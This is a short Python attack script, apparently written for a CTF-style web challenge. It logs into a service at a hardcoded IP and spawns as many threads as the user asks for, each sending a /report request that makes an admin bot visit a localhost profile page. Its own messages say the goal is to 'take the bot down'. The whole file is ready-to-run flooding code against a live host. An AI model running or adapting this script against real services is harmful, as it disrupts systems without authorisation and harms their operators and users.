import requests
import threading

s=requests.Session()

BASE_URL="http://20.102.117.195"

creds= {
    'username':"12345678",
    'password':"12345678"
}

resp=s.post(BASE_URL+"/login",json=creds)

def test_bot(s):
    print("Wohoo let's take the bot down")
    s.post(BASE_URL+"/report",json={ "url":"http://127.0.0.1/profile/2" })


threads=[]

threads_number = int(input("- How many threads do you want ?"))
for i in range(threads_number):
    x = threading.Thread(target=test_bot, args=(s,))
    print("[+] Again launcing bot",i)
    threads.append(x)
    x.start()

for th in threads:
    th.join()
